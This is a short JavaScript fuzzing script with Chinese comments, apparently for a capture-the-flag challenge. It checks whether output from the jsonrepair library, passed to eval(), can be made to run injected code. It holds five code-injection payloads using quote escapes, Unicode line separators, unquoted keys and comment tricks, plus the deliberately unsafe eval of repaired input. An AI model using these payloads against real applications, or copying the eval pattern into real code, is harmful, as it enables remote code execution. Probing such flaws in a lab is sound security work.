/* fuzz.js - 放在题目目录下运行 (需安装 node_modules) */
import { jsonrepair } from "jsonrepair";

// 模拟题目逻辑
function check(input) {
    try {
        const repaired = jsonrepair(input);
        console.log(`[Input]: ${input}`);
        console.log(`[Repaired String]: ${repaired}`);
        
        // 尝试 eval
        try {
            const result = eval(repaired);
            console.log(`[Eval Result]:`, result);
            console.log(`[Type]:`, typeof result);
            
            // 检查是否是字符串字面量（失败情况）
            if (typeof result === 'string' && (result.includes('console') || result.includes('import'))) {
                console.log("[-] 失败: 代码被当做字符串处理了");
            } else {
                console.log("[?] 注意: 非字符串返回，可能利用！");
            }
        } catch (e) {
            console.log(`[Eval Error]: ${e.message}`);
        }
    } catch (e) {
        console.log(`[Repair Error]: ${e.message}`);
    }
    console.log("-".repeat(20));
}

// 1. 测试常规 Payload
check('"\u0022; console.log(123); //"');

// 2. 测试 Test 8 的变种 (尝试利用数组拆分特性)
check('"\u0022; (function(){console.log("RCE")})() //"');

// 3. 测试 Unicode 混淆
// 尝试利用 \u2028 (行分隔符) 或 \u2029 (段落分隔符) 截断字符串
check('"\u0022 \u2028 console.log(1) \u2028 //"');

// 4. 测试特定的 jsonrepair 绕过 (针对 3.x 版本)
// 尝试构造一个对象，键名不带引号
check('{ console.log(1) : 1 }');

// 5. 尝试利用注释
check('/* \u0022 */ console.log(1) //');
